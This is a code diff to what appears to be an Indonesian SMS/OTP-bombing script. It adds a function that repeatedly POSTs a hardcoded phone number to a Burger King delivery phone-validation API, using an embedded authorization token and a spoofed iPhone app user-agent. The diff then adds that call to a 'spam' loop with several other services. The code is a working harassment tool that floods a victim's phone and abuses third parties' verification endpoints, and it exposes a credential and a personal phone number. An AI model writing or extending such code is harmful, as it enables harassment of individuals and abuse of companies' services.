@@ -516,7 +516,27 @@ def DuniaGames():
     except:
         print(Fore.RED, "[DUNIAGAMES] STATUS => NETWORK SUSPENDED BY CLOUDFLARE FIREWALL")
 
-    
+def BurgerKing():
+
+    url = "https://bkdelivery.co.id/api/auth/validate-phone"
+
+    payload = {"mobile_number": "+6285173115683"}
+    headers = {
+        "accept": "*/*",
+        "content-type": "application/json",
+        "accept-encoding": "gzip, deflate, br",
+        "authorization": "token Ad1257bJkalknd99alLLyzOdMKGPLoUpTjGjvDyjjLP6mIVrw6Kfnvej5LK2w3J2XGGBz",
+        "user-agent": "bk_ios/192 CFNetwork/1333.0.4 Darwin/21.5.0",
+        "accept-language": "en-GB,en;q=0.9"
+    }
+
+    response = requests.request("POST", url, json=payload, headers=headers)
+
+    x = json.loads(response.text)
+    if (response.status_code == 200):
+        print (Fore.GREEN, "[BURGERKING] STATUS => ",x["status"])
+    else:
+        print (Fore.RED, "[BURGERKING] STATUS => Too Many Request !")
 
 def countdown(t):
     real = t
@@ -538,6 +558,7 @@ def loading():
     os.system('cls')
 
 for x in range(spam):
+    BurgerKing()
     Doss()
     DuniaGames()
     AlfaGift()
